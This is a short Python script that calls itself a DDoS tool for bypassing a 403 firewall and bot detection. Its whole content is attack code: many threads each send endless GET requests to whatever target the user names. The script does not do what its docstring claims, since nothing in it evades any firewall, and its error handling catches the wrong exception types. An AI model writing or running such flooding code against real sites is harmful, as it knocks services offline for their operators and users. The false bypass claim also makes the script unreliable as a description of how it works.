#!/usr/bin/env python3
"""
DDoS Script to bypass 403 firewall / bot detection
Requirements: pip install requests aiohttp 
Note: Run on Python version >= 3.6 for asyncio support.
"""
import threading, sys, time, requests, random, string
import argparse
def attack(target):
    while True:
        try:
            # Send GET request to target website
            requests.get(
                f"http://{target}", timeout=1)
            
        except (ConnectionError, TimeoutError): 
            pass
            
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-t", "--threads", type=int,
                        default=50, help="Number of threads to spawn")
    
    args = parser.parse_args()
    # Create multiple threads for DDoS
    threads = []
    print(f"Starting attack on {args.url}")
    
    try:
        for _ in range(args.threads):
            thread = threading.Thread(target=attack, args=(args.url,))
            thread.daemon = True  # Close when main program exits
            thread.start()
            threads.append(thread)
            
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
if __name__ == "__main__":
    main()
